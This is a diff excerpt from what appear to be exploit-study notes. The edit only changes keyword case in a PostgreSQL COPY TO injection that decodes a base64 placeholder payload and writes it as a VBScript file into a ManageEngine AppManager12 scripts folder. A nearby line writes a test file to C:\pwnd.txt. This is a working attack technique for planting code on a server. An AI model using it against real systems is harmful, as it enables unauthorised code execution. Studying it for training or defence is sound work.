@@ -61,7 +61,7 @@ COPY (select $$awae$$) to $$C:\pwnd.txt$$
 Example:
 
 ```
-copy (select convert_from(decode($$B64_URL_ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to $$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
+COPY (SELECT convert_from(decode($$B64_URL_ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) TO $$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
 ```
 
 1. We need to use base64 encoding to avoid any issues with restricted characters within the COPY TO function.
